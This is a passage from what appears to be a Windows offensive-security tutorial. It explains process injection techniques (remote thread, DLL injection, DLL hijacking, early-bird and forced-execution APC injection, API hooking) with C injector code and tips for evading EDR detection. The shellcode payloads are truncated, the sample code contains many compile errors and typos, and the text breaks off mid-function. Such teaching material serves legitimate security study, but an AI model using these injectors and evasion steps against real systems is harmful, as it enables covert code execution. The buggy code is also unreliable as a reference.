<li><code>lpThreadId</code>: An optional pointer to a DWORD variable that receives the unique identifier of the newly created thread.</li>
<li><code>CreateRemoteThread</code> returns a HANDLE to the newly created thread in the target process.</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Here is an example of a simple, remote thread injection program:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;

unsigned char payload[] =
"\xfc\x48\x83\xe4..."
[...trunc...]
"...\xda\xff\xd5";

unsigned int payload_len = sizeof(payload);

int main(int argc, char* argv[]){
    HANDLE process_handle;
    HANDLE thread_handle;
    PVOID remote_buffer;

    // Opens the process with the PID given as the first command line argument
    process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));

    remote_buffer = VirtualAllocEx(process_handle, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(process_handle, remote_buffer, payload, payload_length, NULL);
    remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LP_START_ROUTINE)remote_buffer, NULL, 0, NULL);

    CloseHandle(process_handle);
}
</code></pre>
<p>Where:</p>
<ul>
<li><code>CloseHandle</code>: A crucial Windows API function used to decrement the reference cound of an open kernel object handle. It is essential for:
<ul>
<li><code>Resource Management</code>: Failing to call <code>CloseHandle</code> can lead to handle leaks. The kernel will keep the object and its memory allocated, which can degrade the stability of the target system over time. This is bad <code>OpSec</code>.</li>
<li><code>Stealth/Cleanup</code>: A common detection heuristic is to look for processes that hold numerous handles to other processes (especially high-privileged handles). Closing the handles immediately after they are used minimizes the window of time for security products to observe the suspicious state, aiding in cleanup and evasion.</li>
</ul>
<pre><code class="language-C">BOOL CloseHandle(
    [in] HANDLE hObject
);
</code></pre>
Here are the <code>CloseHandle</code> function's parameters:
<ul>
<li><code>[in]</code>: A Windows API function signature annotation, known as a <strong>Microsoft Source-Code Annotation Language</strong> (SAL) tag, that indicates a parameter's value is input (Read-only) to a function, and must be initialized before being passed to the function.</li>
<li><code>hObject</code>: The handle to an open object.</li>
<li><code>CloseHandle</code> returns <code>TRUE</code> is successful, <code>FALSE</code> upon failure.</li>
</ul>
</li>
</ul>
<h3 id="integrity-levels-and-the-mic"><a class="header" href="#integrity-levels-and-the-mic">Integrity Levels and the MIC</a></h3>
<p>When injecting into a process, it is imperative to consider the <strong>Integrity Level</strong> the process holds. <strong>Mandatory Integrity Control</strong> (MIC) is a core security mechanism in Windows that controls how processes can interact with each other and with system objects. It serves as an additional layer of defense that can be broken into two parts:</p>
<ul>
<li><strong>Integrity Level</strong> (IL): Every process and securable object (i.e., files, registry keys, mutexes, etc.) is assigned an Integrity Level.</li>
<li><strong>Access Rule</strong> (The Safeguard): <strong>No Write-Up</strong>. A process can only write to objects that have an equal or lower Integrity Level.
<ul>
<li><code>Low -&gt; High</code>: A <code>Low_Integrity</code> process cannot write to a <code>Medium_Integrity</code> process (i.e., sandboxed web browser -&gt;! File Explorer).</li>
<li><code>High -&gt; Medium</code>: A <code>High_Integrity</code> process can write to a <code>Medium_Integrity</code> process.</li>
</ul>
</li>
</ul>
<p>Each level describes the degree of trust and access a process has:</p>
<div class="table-wrapper"><table><thead><tr><th>Integrity Level (IL)</th><th>User/Process Type</th><th>Context and Security Implication</th></tr></thead><tbody>
<tr><td>System</td><td>SYSTEM</td><td>The highest level, reserved for core OS services. Highly protected and highly capable</td></tr>
<tr><td>High</td><td>Administrator (Elevated)</td><td>Used when a user clicks <code>Yes</code> to a <strong>User Account Control</strong> (UAC) prompt. Full admin privileges</td></tr>
<tr><td>Medium</td><td>Standard User/Administrator (non-elevated)</td><td>Default level for most user applications, even when launched by an administrator without UAC elevation</td></tr>
<tr><td>Low</td><td>Restricted/sandboxed</td><td>Reserved for highly vulnerable processes. Protects the system from unwanted changes.</td></tr>
</tbody></table>
</div>
<h3 id="dll-injection"><a class="header" href="#dll-injection">DLL Injection</a></h3>
<p>Traditional <strong>DLL Injection</strong> involves injecting a Dynamic Link Library into the address space of a process, giving the attacker control over the process's execution:</p>
<pre><code class="language-C">//evil_dll_1.c

#include &lt;windows.h&gt;
BOOL APIENTRY DllMain(HMODULE hModule, DWORD nReason, LPVOID lpReserved){
    switch(nReason){
    case DLL_PROCESS_ATTACH:
        MessageBox(
        NULL,
        "You Have Been Hacked!",
        "&gt;:-)",
        MB_OK
        );
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
</code></pre>
<p>The code within <code>DLLMain</code> is executed immediately following DLL memory loading (after running <code>LdrpRunInitializeRoutines</code>), providing a simple means of executing code within the context of another process.</p>
<p>After the malicious DLL is crafted and downloaded on the target system, an injector is crafted that will copy this DLL into the memory space of a given process:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;

char dllPath[] = "C:\\Users\\Administrator\\Downloads\\evil.dll";
unsigned int dll_len = sizeof(dllPath) + 1;

int main(int argc, char* arvg[]){
    HMODULE hThread;
    HMODULE hProcess;
    PVOID remote_buffer;

    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    VOID *lpbuffer = GetProcAddress(hKernel32, "LoadLibraryA");

    if(atoi(argv[1]) == 0){
        return -1;
    }
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)atoi(argv[1]));
    remote_buffer = VirtualAllocEx(hProcess, NULL, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remote_buffer, dllPath, dll_len, NULL);
    remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)lpbuffer, remote_buffer, 0, NULL);
    CloseHandle(hProcess);

    return 0;
}
</code></pre>
<p>Where:</p>
<ul>
<li>
<p><code>GetModuleHandle</code>: A Windows API function used to retrieve a handle to a loaded module (typically a DLL or the executable itself) in the current process's virtual address space.</p>
<pre><code class="language-C">HMODULE GetModuleHandleW(
    [in, optional] LPCWSTR lpModuleName
);
</code></pre>
<ul>
<li>Here is a breakdown of the <code>GetModuleHandleW</code> function's parameters:
<ul>
<li><code>lpModuleName</code>: A pointer to the name of the loaded module (<code>.dll</code> or <code>.exe</code>) you want the handle for.
<ul>
<li><strong>NOTE</strong>: <code>LPCWSTR</code> = <strong>Long Pointer Constant Wide-Character String</strong></li>
</ul>
</li>
<li><code>GetModuleHandleW</code> returns a <strong>handle</strong>, i.e., the starting address where the module is loaded in the current process's memory, to the specified module if successful. If it fails, it returns <code>NULL</code>.</li>
</ul>
</li>
</ul>
</li>
<li>
<p><code>GetProcAddress</code>: A fundamental Windows API function used to retrieve the memory address of an exported function (or variable) from a loaded DLL.</p>
<pre><code class="language-C">FARPROC GetProcAddress(
    [in] HMODULE hModule,
    [in] LPCSTR lpProcName
);
</code></pre>
<ul>
<li>Here is the <code>GetProcAddress</code> function's parameters:
<ul>
<li><code>hModule</code>: A handle to the DLL module that contains the function that you want to retrieve. Represents the base address where the process's memory holds the DLL.</li>
<li><code>lpProcName</code>: The name of the exported function as a <code>NULL</code>-terminated string or the function's <strong>ordinal value</strong> (the integer index within the DLL's export table, which ust be known beforehand).
<ul>
<li><code>GetProcAddress</code> returns a <code>FARPROC</code> object on success. <code>NULL</code> upon failure.
<ul>
<li><code>FARPROC</code>: a fundamental Windows API data type defined as a generic pointer to a function, meant to hold the memory address of any exported function from a DLL, regardless of the function's actual return type, parameters, or calling convention. It is defined in <code>&lt;windows.h&gt;</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="dynamic-api-resolution"><a class="header" href="#dynamic-api-resolution">Dynamic API Resolution</a></h4>
<p>The API sequence previously used (i.e., <code>GetModuleHandle</code> -&gt; <code>GetProcAddress</code>) is an example of <strong>Dynamic API resolution</strong>, a technique used by malware to obfuscate its functionality. In modern Windows, Dynamic API resolution can be mitigated with <strong>Control Flow Guard</strong>. Control Flow Guard is a security features in Microsoft Windows designed to mitigate memory corruption vulnerabilities by enforcing tight restrictions on indirect control-flow transfers. It works by verifying that the target address of any indirect function call (i.e., calls made through a function pointer) is a pre-determined, valid function entry point, thus making it significantly harder for an attacker to hijack a program's execution flow.</p>
<h3 id="dll-hijacking"><a class="header" href="#dll-hijacking">DLL Hijacking</a></h3>
<p><strong>Hijacking</strong> is the action of taking over (something) and using it for a different purpose. <strong>DLL Hijacking</strong> (i.e., <strong>DLL Preloading Attack</strong>) is a technique that exploits the way the Windows operating system searches for and loads a Dynamic Link Library (DLL) file required by a legitimate application. It leverages the <strong>DLL Search Order</strong> used by Windows when an application calls a function like <code>LoadLibrary</code> without specifying a fully qualified trusted file path (i.e., calling <code>malicious.dll</code>, rather than <code>C:\Windows\System32\malicious.dll</code>).</p>
<p><code>Load Library</code> is the primary Windows API call used to map a specified module (usually a DLL) into the address space of the calling process. It has several variations, including <code>LoadLibraryA</code>, <code>LoadLibraryW</code>, <code>LoadLibraryExA</code>, and <code>LoadLibraryExW</code>, but the most basic and common form, <code>LoadLibrary</code> takes a single parameters:</p>
<pre><code class="language-C">HMODULE LoadLibrary(
    [in] LPCSTR lpLibFileName
);
</code></pre>
<p>Where:</p>
<ul>
<li><code>lpLibFileName</code>: A <code>NULL</code>-terminated string that specifies the name of the module (DLL) to load. If a full path is specified (i.e., <code>C:\Windows\System32\kernel32.dll</code>), the function attempts to load the DLL directly from that path. This is the secure way for applications to load DLLs. If only a module name is specified (i.e., <code>kernel32.dll</code>), the function initiates the <strong>DLL Search Order</strong> process, which is the mechanism exploited by <strong>DLL Hijacking</strong>.</li>
</ul>
<div id="admonition-note-3" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-3-title">
<div class="admonition-title">
<div id="admonition-note-3-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Essentials.html#admonition-note-3"></a>
</div>
<div>
<p><strong>The DLL Search Order</strong>
When a relative module path is given, a function will search for the appropriate DLL in the following order:</p>
<ol>
<li>DLLs already loaded in memory</li>
<li>Known DLLs (registry key <code>HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls</code>)</li>
<li>Application's directory</li>
<li><code>C:\Windows\System32</code></li>
<li><code>C:\Windows\System</code></li>
<li><code>C:\Windows</code></li>
<li>Current Directory</li>
<li>Directories in the system <code>PATH</code> environment variable</li>
<li>Directories in the user <code>PATH</code> environment variable.</li>
</ol>
</div>
</div>
<p>The <code>LoadLibraryEx</code> version is more advanced, and contains additional parameters:</p>
<pre><code class="language-C">HMODULE LoadLibraryEx(
    [in] LPCSTR lpLibFileName,
    [in] HANDLE hFile,
    [in] DWORD dwFlags
);
</code></pre>
<p>Where:</p>
<ul>
<li><code>lpLibFileName</code>: Same as <code>LoadLibrary</code></li>
<li><code>hFile</code>: A legacy parameter, formerly used to allow a process to load a DLL based on an existing file stream or handle, but in a modern context is set to a <code>NULL</code> value.</li>
<li><code>dwFlags</code>: Control flags that govern the loading process. These flags are critical for stealth and security.
<ul>
<li><code>DONT_RESOLVE_DLL_REFERENCES</code> (0x00000001): Loads the module but does not execute its <code>DllMain</code> function or resolve its imported function.</li>
<li><code>LOAD_WITH_ALTERED_SEARCH_PATH</code> (0x00000008): Changes the search order to begin in the directory of the module being loaded.</li>
<li><code>LOAD_IGNORE_CODE_AUTHZ_LEVEL</code> (0x00000010): Bypasses some signature validation checks.</li>
<li><code>LoadLibraryEx</code> returns an <code>HMODULE</code> on success, <code>NULL</code> if it fails.</li>
</ul>
</li>
</ul>
<div id="admonition-note-4" class="admonition admonish-note" role="note" aria-labelledby="admonition-note-4-title">
<div class="admonition-title">
<div id="admonition-note-4-title">
<p>Note</p>
</div>
<a class="admonition-anchor-link" href="Essentials.html#admonition-note-4"></a>
</div>
<div>
<p><strong>How it Works</strong>: <em>Dll Hijacking</em>
<strong>Dll Hijacking</strong> is pretty basic in practice, being broken into 3 distinct steps:</p>
<ol>
<li><strong>Identify the Vulnerable Application</strong>: The attacker identifies a legitimate application (often a signed system utility or a third-party tool) that attempts to load a DLL using an insecure method.</li>
<li><strong>Exploiting the Search Order</strong>: When the application starts, Windows begins searching a defined sequence of directories for the missing DLL, which often includes locations that a low-privileged user may have write access to, such as:
_ The directory from which the application was loaded
_ The current working directory * Directories listed in the user's <code>PATH</code> environment variable
The attacker places a malicious DLL file, renamed to the exact filename of the DLL the application is searching for, into one of these less-secure high priority locations.</li>
<li><strong>Hijacking</strong>: When the legitimate application runs, the operating system finds the malicious DLL in the high-priority directory first and loads it, executing the attacker's code.</li>
</ol>
</div>
</div>
<h3 id="apc-injection"><a class="header" href="#apc-injection">APC Injection</a></h3>
<p><strong>APC Injection</strong> is a stealthy technique used to force a thread in a target process to execute code supplied by the attacker by queuing an <strong>Asynchronous Procedure Call</strong> object to a target threads APC queue. <code>QueueUserAPC</code> is the primary Windows API function used to schedule an APC routine to run within the context of a specified thread.</p>
<pre><code class="language-C">DWORD QueueUserApc(
    PAPCFUNC pfnAPC,
    HANDLE hThread,
    ULONG_PTR dwData
);
</code></pre>
<p>Here are the <code>QueueUserAPC</code> function's parameters:</p>
<ul>
<li><code>pfnAPC</code>: A pointer to the APC function (or shellcode) you want the target thread to execute.</li>
<li><code>hThread</code>: The handle of the target thread whose APC queue will receive the call, which must have the <code>THREAD_SET_CONTEXT</code> access rights in order to add an item to the thread's APC queue.</li>
<li><code>dwData</code>: A single, optional, user-specified value that is passed as the only argument to the APC function (<code>pfnAPC</code>) when it executes.</li>
</ul>
<p>There are many types of <strong>APC Injection</strong> attack, including:</p>
<ul>
<li>
<p><code>Traditional APC Injection</code> (Remote): An injection attack which avoids creating a new thread by appending the address of some malicious code to the APC queue of an existing, legitimate thread.</p>
<ul>
<li><strong>Steps</strong>:
<ol>
<li><strong>Allocate/Write</strong>: Allocate memory and write the shellcode into the remote process using <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>.</li>
<li><strong>Queue</strong>: Queue the shellcode address to a thread in the remote process using <code>QueueUserAPC</code> (or its native equivalent <code>NtQueueApcThread</code>)</li>
</ol>
</li>
<li>The malicious code executes only when the target thread enters an alertable wait state by calling an API like <code>SleepEx</code>, <code>WaitForSingleObjectEx</code>, or <code>MsgWaitForMultipleObjectsEx</code>.</li>
</ul>
</li>
<li>
<p><code>Early-Bird APC Injection</code>: An APC injection attack which executes code in a newly created process before its legitimate entry point code runs, effectively bypassing early-stage security hooks.</p>
<ul>
<li><strong>Steps</strong>:
<ol>
<li><strong>Create Suspended Thread</strong>: The injector creates the target process (i.e., <code>notepad.exe</code>) using the <code>CREATE_SUSPENDED</code> flag, so the initial thread does not immediately execute.</li>
<li><strong>Inject &amp; Queue</strong>: The injector allocates memory, writes the shellcode, and queues the APC (using <code>QueueUserAPC</code>) to the main, suspended thread.</li>
<li><strong>Resume</strong>: The injector calls <code>ResumeThread</code>. When the thread is resumed, the operating system's kernel dispatcher immediately checks for pending APCs before running the process's normal start function (<code>LdrInitializeThunk</code>), causing the malicious APC to run first.</li>
</ol>
</li>
</ul>
</li>
<li>
<p><code>Forced Execution APC</code> (Local Injection): A method of APC injection which guarantees immediate execution of a queued APC within the current thread/process by making direct calls to the Native API, circumventing the need to rely on a high-level API entering a wait state.</p>
<ul>
<li><strong>Steps</strong>:
<ol>
<li><strong>Queue</strong>: The code queues the APC (using <code>QueueUserAPC</code>) to one of its own threads (using <code>GetCurrentThread()</code>).</li>
<li><code>Force Execution</code>: Then, it directly calls the internal Windows Native API function ,<code>NtTestAlert</code>, forcing the current thread to immediately check and process its APC queue.</li>
</ol>
</li>
<li>This method bypasses detection logic that looks for the sequence of <code>QueueUserAPC</code> followed by a high-level alertable wait function (<code>SleepEx</code>, etc.). However, the direct manual call to the un-exported <code>NtTestAlert</code> function is often a string indicator of malicious activity for advanced EDRs.</li>
</ul>
</li>
<li>
<p><code>Implicit APCs</code> (via Callbacks): An APC injection method, which utilizes Asynchronous functions where a callback function is specified. When the I/O or timer operation completes, the Windows kernel queues a kernel-mode APC to the waiting thread, which executes a stub that eventually calls the user-provided function (the malicious payload).</p>
</li>
</ul>
<h4 id="early-bird-apc-injection"><a class="header" href="#early-bird-apc-injection">Early-Bird APC Injection</a></h4>
<p>An early-bird APC injection creates a suspended process and loads an APC using <code>QueueUserAPC</code>, so that once the thread has resumed execution, it runs the function loaded in the APC queue:</p>
<pre><code class="language-C">#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;&gt;
#include &lt;stdlib.h&gt;

unsigned payload[] =
"\xfc\x48\x83\xe4..."
[...trunc...]
"...\xda\xff\xd5";

int main(){
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInfo;
    LPVOID payloadMem;
    SIZE_T payloadLen = sizeof(payload);
    LPCWSTR cmd;
    HANDLE processHandle, threadHandle;
    NTSTATUS status;
    ZeroMemory(&amp;startupInfo, sizeof(startupInfo));
    ZeroMemory(&amp;processInfo, sizeof(processInfo));
    startupInfo.cb = sizeof(startupInfo);

    CreateProcessA(
        "C:\\Windows\\System32\\notepad.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL, NULL, &amp;startupInfo, &amp;processInfo
    );

    WaitForSingleObject(processInfo.hProcess, 50000);
    processHandle = processInfo.hProcess;
    threadHandle = processInfo.hThread;
    payloadMem = VirtualAllocEx(processHandle, NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, payloadMem, payload, payloadLen, NULL);
    PTHREAD_TART_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)payloadMem;
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, (ULONG_PTR)NULL);
    ResumeThread(threadHandle);
    return 0;
}
</code></pre>
<p>Where:</p>
<ul>
<li><code>ZeroMemory</code>: A macro defined in the Windows headers, used to clear buffers that may contain sensitive data.
<pre><code class="language-C">VOID ZeroMemory(
    PVOID Destination,
    SIZE_T Length
);
</code></pre>
Here is a breakdown of the <code>ZeroMemory</code> function's parameters:
<ul>
<li><code>Destination</code>: A pointer to the starting address of the memory block that is to be filled with zeros. The memory block must be allocated and accessible to the calling process.</li>
<li><code>Length</code>: The number of bytes in the memory block, starting from <code>Destination</code>, that should be set to zero.</li>
<li><code>ZeroMemory</code> does not return anything.</li>
</ul>
</li>
</ul>
<h4 id="forced-execution-apc"><a class="header" href="#forced-execution-apc">Forced Execution APC</a></h4>
<p>Forced Execution APC occurs when a process accesses the memory space of a running process, adds a function to the APC queue, then uses a Native API call to force the execution of the queued function:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;windows.h&gt;

using NtTestAlertFunction = NTSTATUS(NTAPI*)();

unsigned char payload[] =
"\xfc\x48\x83..."
[...trunc...]
"...\xda\xff\xd5";

unsigned int payload_len = sizeof(payload);

int main(int argc, char* argv[]){
	HMODULE ntdllModule = GetModuleHandleA("ntdll");
	NtTestAlertFunction testAlert = (NtTestAlertFunction)GetProcAddress(ntdllModule, "NtTestAlert");

	LPVOID payload_mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(payload_mem, payload, payload_len);
	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)payload_mem;
	QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
	testAlert();

	return 0;
}
</code></pre>
<p>Where:</p>
<ul>
<li><code>using</code>: The C++11 type alias syntax, which creates a new, readable type name. This allows the developer to use an alias for a given function call. It is equivalent to using <code>typedef</code>:
<ul>
<li><code>using NtTestAlertFunction = NTSTATUS(NTAPI*)();</code> -&gt; <code>typedef NTSTATUS (NTAPI NtTestAlertFunction)();</code>
<ul>
<li><code>NTSTATUS</code>: The return type of the function. <code>NTSTATUS</code> is the standard data type used by the Native API (<code>ntdll.dll</code>) to indicate success or failure.</li>
<li><code>(NTAPI*)</code>: Specifies that <code>NtTestAlertFunction</code> will be a pointer variable capable of holding the memory address of the actual <code>NtTestAlert</code> function. Used to declare the variable as a pointer to a function <code>(*)</code> that uses the NTAPI (<code>__stdcall</code>) calling convention.</li>
<li><code>()</code> Indicates the function's parameters. An empty set signifies no arguments passed.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="api-hooking"><a class="header" href="#api-hooking">API Hooking</a></h3>
<p><strong>API Hooking</strong> is a method used to manipulate and alter the functionality and sequence of API calls. It works by diverting a function call from its original, intended destination to a custom, user-supplied function (the "hook"). It can generally be reduced to 3 steps:</p>
<ol>
<li><strong>Identification</strong>: The program identifies a target API function to intercept (ie., <code>CreateFileA</code>, <code>LoadLibraryA</code>, <code>Send</code>).</li>
<li><strong>Redirection</strong>: The memory at the beginning of the target function is modified (patched) to contain an instruction (often a <code>JMP</code> or <code>CALL</code>) that redirects execution from the attackers custom function.</li>
<li><strong>Custom Execution</strong>: The custom function runs, inspects the parameters, modifies data, performs logging or executes its own payload. Then it typically does one of two things:
<ul>
<li><strong>Calls the original function</strong>: Executes the original, un-hooked code and returns the result.</li>
<li><strong>Blocks the call</strong>: Skips the original function entirely and returns a custom error or success code.</li>
</ul>
</li>
</ol>
<p>API Hooking can be employed by legitimate programs. <strong>Endpoint Detection and Response</strong> (EDR) systems and antivirus software monitor sensitive API calls (like disk access, network connections, or process creation) for signs of malicious behavior. Debuggers and profiling tools (like <code>Wireshark</code> &amp; <code>API Monitor</code>) log every function call and its parameters for analysis and troubleshooting. You may also come across <strong>Compatibility Shims</strong>, which are a feature that allows older software to run on newer operating systems by intercepting an outdated function call and redirecting it to a newer, compatible function.</p>
<p>On the other hand, API hooking is used for many malicious purposes as well. Primarily, it is used as an anti-analysis technique. For instance, consider a malware sample that hooks functions like <code>IsDebuggerPresent</code> and <code>OutputDebugString</code> to return a false result. EDR and other automated sandbox systems analyze the behavior a program demonstrates when attempting to identify malware. If the sandboxed program crashes or loops, it is assumed the program in question is malicious. By forcing the API call to return false, these detection schemes can be fooled. Other methods are used to determine if the malware is actually being reverse-engineered (i.e., checking kernel data structures manually, obscuring how much time passes between actions, and looking for signs of virtual environments).</p>
<p>Let's consider the following example:</p>
<ul>
<li>
<p>Given some DLL:</p>
<pre><code class="language-C">entertainment.c
#include &lt;windows.h&gt;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved){
    switch(dwReasonForCall){
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
}

extern "C" {
    __declspec(dllexport) int _cdecl Movie(LPCSTR message){
        MessageBox(NULL, message, "l&gt;[-]", MB_OK);        // camera
        return 1;
    }
}

extern "C" {
    __declspec(dllexport) int _cdecl Song(LPCSTR message){
        MessageBox(NULL, message, "OO=[]:", MB_OK);        // guitar
        return 1;
    }
}

extern "C" {
    __declspec(dllexport) int _cdecl Show(LPCSTR message){
        MessageBox(NULL, message, "l&gt;[-]", MB_OK);    // camera
        return 1;
    }
}

extern "C"{
    __declspec(dllexport) int _cdecl Game(LPCSTR message){
        MessageBox(NULL, message, "&lt;-,-&gt;,A,B", MB_OK);
        return 1;
    }
}
</code></pre>
<p>Where:</p>
<ul>
<li><code>extern "C" {...}</code>: A C++ linkage specification that tells the C++ compiler to compile the enclosed code using C-style linkage conventions instead of C++ name mangling. This is done because C++ compilers typically mangle function names to support features like function overloading and when a DLL exports a function, the calling application (which may be written in <code>C</code>, <code>C#</code>, or another language) needs to find the exact, unmangled function name.</li>
<li><code>__declspec(dllexport)</code>: A Microsoft specific compiler extension that instructs the linker to export the function from the DLL to ensure that function's name and address are placed into the DLL's <strong>Export Address Table</strong> (EAT), making it visible and callable by other executable modules (<code>exe</code> or other DLLs).</li>
<li><code>int _cdecl Music(LPCSTR message){...}</code>: The function parameter.
<ul>
<li><code>LPCSTR</code>: A Windows data type that stands for Long Pointer to a Constant T-String
<ul>
<li>A T-String can resolve to either a 16-bit wide character string (LPCWSTR) or an 8-bit ANSI character string (LPCSTR), depending on the project's Unicode settings.</li>
</ul>
</li>
</ul>
</li>
<li><code>...</code> (Function Body):
<ul>
<li><code>MessageBox(...)</code>: Displays a modal dialog box to the user, which the user must interact with (click a button) before they can continue working in the application's owner window.</li>
</ul>
<pre><code class="language-C">int MessageBox(
    [in, optional] HWND hWnd,
    [in, optional] LPCSTR lpText,
    [in, optional] LPCTSTR lpCaption,
    [in, optional] UINT uType
);
</code></pre>
Here are the <code>MessageBox</code> function's parameters:
<ul>
<li><code>HWND hWnd</code>: A handle to the window of the message box. If 'NULL, the message box has no owner and is typically modeless relative to the application's main thread, but will still block the current execution flow.</li>
<li><code>LPCSTR lpText</code>: The message to be displayed in the dialog box's content area (i.e., the main body of the window)</li>
<li><code>LPCTSTR lpCaption</code>: The title of the dialog box, displayed in the dialog box's title bar. If <code>NULL</code>, the default title is usually "Error".</li>
<li><code>UINT uType</code>: A combination of flags that define the contents and behavior of the message box, including the buttons and the icon displayed.
<ul>
<li><code>MB_OK</code>: Displays a single <code>OK</code> button.</li>
<li><code>MB_YESNO</code>: Displays <code>Yes</code> and <code>No</code> buttons</li>
<li><code>MB_OKCANCEL</code>: Displays <code>OK</code> and <code>Cancel</code> buttons</li>
<li><code>MB_ABORTRETRYIGNORE</code>: Displays 3 buttons, <code>Abort</code>, <code>Retry</code>, and <code>Ignore</code>. On modern systems, it's recommended to use <code>MB_CANCELTRYCONTINUE</code> instead.</li>
<li><code>MB_ICONERROR</code>: Displays a critical stop sign (red x)</li>
<li><code>MB_ICONQUESTION</code>: Displays a question mark icon</li>
<li><code>MB_ICONINFORMATION</code>: Displays an information icon (Blue <code>i</code>)</li>
</ul>
</li>
<li><code>MessageBox</code> returns an integer value indicating which button the user clicked (i.e., <code>IDOK</code>, <code>IDYES</code>, <code>IDCANCEL</code>, etc.)</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Now, to verify that the DLL we created works, we can write a basic program, which includes it and calls the exported functions.</p>
</li>
</ul>
<pre><code class="language-C">// test_hook.c
#include &lt;windows.h&gt;

typedef int (__cdecl *MovieFunction)(LPCSTR message);
typedef int (__cdecl *SongFunction)(LPCSTR message);

int main(void){
    HINSTANCE entDll;
    MovieFunction movieFunction;
    SongFunction songFunction;
    BOOL unloadResult;

    if (entDll != NULL){
        entDll = LoadLibrary("entertainmentDll.dll");
        movieFunction = (MovieFunction)GetProcAddress(entDll, "Movie");
        songFunction = (SongFunction)GetProcAddress(entDll, "Song");
        if((movieFunction != NULL) &amp;&amp; (songFunction != NULL)){
            (movieFunction)("Spider-Man: Across the Spider-Verse");
            (movieFunction)("It's a Disaster");
            (songFunction)("August 10 by Khruangbin")
        }
        unloadResult = FreeLibrary(entDll);
    }
    return 0;
}
</code></pre>
<p>Where:</p>
<ul>
<li><code>typedef int (__cdecl MovieFunction)(LPCSTR message);</code>: Creates a new type, named <code>MovieFunction</code>, such that any variable declared with this type will be a pointer to a function.</li>
<li><code>(MovieFunction)GetProcAddress(entDll, "Movie");</code>: This is an example of <strong>typecasting</strong>, a way to explicitly convert a value or variable from one data type to another.
<ul>
<li>The core idea here is that <code>GetProcAddress</code> returns the memory address of a function within the <code>entDll</code> module. Typecasting tells the compiler to treat the unspecific function address returned by <code>GetProcAddress</code> as a specific pointer to a function.</li>
</ul>
</li>
<li><code>(movieFunction)("Spider-Man: Across the Spider-Verse")</code>: The parentheses around the function pointers name is called <strong>implicit dereferencing</strong>. This is optional and can often be used for clarity and to maintain consistency with the proper function pointer syntax: <code>(* movieFunction)("Spider-Man: Across the Spider-Verse")</code></li>
</ul>
<p>So, we have our DLL and we know it works. In order to do the actual hooking operation, There are three things that must be accomplished. You must create a piece of malware**, which:</p>
<ol>
<li><strong>Loads the identified API into its own address space.</strong></li>
<li><strong>Contains a function, to hook to which performs the malicious operation.</strong></li>
<li><strong>Hooks the identified API, by patching a <code>JMP</code> instruction to our malicious function into the targeted API call.</strong></li>
</ol>
<p>Here is an example:</p>
<pre><code class="language-C">// hook.c
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;

char OrigBytes[14];

FARPROC hookedFuncAddr;

typedef int (__cdecl OrigMovFunc)(LPCTSTR message);

int __stdcall modMovFunc(LPCSTR message){
    HINSTANCE entDll;
    OrigMovFunc origMovFunc;
    DWORD oldProtect;

    VirtualProtect((LPVOID)hookedFuncAddr, 14, PAGE_READWRITE, &amp;oldProtect);
    WriteProcessMemory(GetCurrentProcess(), (LPVOID)hookedFuncAddr, origBytes, 14 NULL);
    VirtualProtect((LPVOID)hookedFuncAddr, 14, oldProtect, &amp;oldProtect);

    FlushInstructionCache(GetCurrentProcess(), (LPVOID)hookedFuncAddr, 14);
    entDll = LoadLibrary("entertainmentDll.dll");
    origMovFunc = (OrigMovFunc)GetProcAddress(entDll, "Movie");

    return (origMovFunc)("Everything, Everywhere, All At Once");
}

void installHook(){
    HINSTANCE hLib;
    DWORD oldProtect;

    CHAR patch[14] = {0};
    BYTE jmpInstruction[] = {0xFF, 0x25,0x00, 0x00, 0x00, 0x00 }
    UINT_PTR hookFuncAddr;

    hLib = LoadLibraryA("entertainmentDll.dll");
    hookedFuncAddr = GetProcAddress(hLib, "Movie");

    if(hokedFuncAddr = NULL){
        printf("Failed to get `Movie` address.\n");
        return 0;
    }

    ReadProcessMemory(GetCurrentProcess(), (LPVOID)hookedFuncAddr, origBytes, 14, NULL);
